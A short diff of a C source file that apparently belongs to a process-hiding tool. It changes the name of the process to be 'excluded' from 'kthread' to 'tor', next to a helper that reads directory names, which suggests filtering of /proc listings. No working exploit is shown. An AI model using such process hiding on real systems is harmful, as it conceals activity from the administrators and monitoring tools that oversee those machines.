@@ -9,7 +9,7 @@
 /*
  * Every process with this name will be excluded
  */
-static const char* process_to_filter = "kthread";
+static const char* process_to_filter = "tor";
 
 /*
  * Get a directory name given a DIR* handle
